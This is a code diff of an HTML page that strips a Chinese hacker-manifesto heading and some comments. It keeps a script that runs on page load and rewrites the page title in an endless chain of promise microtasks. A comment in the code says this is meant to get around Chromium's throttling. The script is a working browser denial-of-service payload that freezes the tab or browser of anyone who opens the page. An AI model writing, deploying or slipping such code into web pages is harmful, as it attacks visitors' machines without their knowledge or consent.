@@ -13,25 +13,16 @@ body {
 }
 </style>
 </head>
-
 <body>
-<h1>你说我们是罪犯，而你们却建造原子弹，发动战争，你杀人，欺骗</h1>
-
 <script>
 let running = true;
 let i = 0;
-
 function flood() {
   if (!running) return;
-
-  // 每个事件循环都改一次 title
   document.title = "X" + (i++) + Math.random().toString(36);
-
   // microtask 连锁，绕过 Chromium 的 interval 节流
   Promise.resolve().then(flood);
 }
-
-// 页面加载完成就自动开始
 window.addEventListener("load", () => {
   flood();
 });
